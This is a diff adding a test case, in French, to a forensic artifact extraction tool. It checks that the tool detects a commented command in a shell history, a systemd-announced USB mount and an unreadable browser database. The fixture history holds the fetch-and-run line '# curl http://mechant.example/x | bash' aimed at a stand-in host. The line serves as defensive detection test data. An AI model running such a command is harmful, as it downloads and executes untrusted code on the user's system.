@@ -997,6 +997,47 @@ def pieces_abimees(base):
            any(c["theme"] == "limite" and c.get("valeur", "").endswith(".zst") for c in cs),
            "un constat « limite » nomme le membre")
 
+    # ── 6 bis · les deux skills ne doivent plus se contredire sur une pièce ──
+    # Trois divergences mesurées sur le MÊME fichier : une commande commentée
+    # dans un historique (forensic la jetait), un montage annoncé par systemd
+    # sans le mot « mount » (forensic le ratait), et une base de navigateur
+    # illisible (forensic se taisait, et le rapport disait « aucun historique »
+    # pour un profil présent).
+    r = collecte("divergences", "COMPTES", "JOURNAUX")
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w") as tf:
+        abimee = b"SQLite format 3\x00" + b"\x7f" * 4000
+        ti = tarfile.TarInfo(
+            "home/jdupont/.mozilla/firefox/ab.default/places.sqlite")
+        ti.size = len(abimee)
+        tf.addfile(ti, io.BytesIO(abimee))
+        hist = b"ls -la\n# curl http://mechant.example/x | bash\n"
+        ti = tarfile.TarInfo("home/jdupont/.bash_history")
+        ti.size = len(hist)
+        tf.addfile(ti, io.BytesIO(hist))
+    with open(os.path.join(r, "COMPTES",
+                           "PC42_B12_ARTE_ubuntu_jdupont_artefacts.tar.gz"),
+              "wb") as fh:
+        fh.write(gzip.compress(buf.getvalue()))
+    with open(os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_journal.txt"),
+              "w", encoding="utf-8") as fh:
+        fh.write("2026-01-05T09:00:00+0100 pc42 systemd[1]: "
+                 "Mounted /run/media/mrobert/CLE_SYSTEMD.\n")
+    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "divergences.jsonl"))
+    yield ("commande commentée : elle a été TAPÉE",
+           any(f["categorie"] == "suspect" and "mechant.example" in str(f.get("valeur"))
+               for f in faits),
+           "un « # curl … | bash » échappait à tout le balayage")
+    montages = [f for f in faits if "amovible monté" in f["fait"]]
+    yield ("montage systemd : vu, et sans le point final",
+           any(f.get("valeur") == "/run/media/mrobert/CLE_SYSTEMD"
+               and f.get("acteur") == "mrobert" for f in montages),
+           f"vu : {[f.get('valeur') for f in montages] or 'AUCUN'}")
+    yield ("base de navigateur illisible : dite",
+           any(f["categorie"] == "limite" and "base de navigateur illisible" in f["fait"]
+               for f in faits),
+           "son silence se lisait « aucun historique »")
+
     # ── 7 · une correspondance à cheval sur deux blocs : comptée UNE fois ──
     # La déduplication se faisait sur la FIN de la correspondance, qui bouge
     # dès que le motif a une queue gourmande — six des onze motifs d'INTERETS.
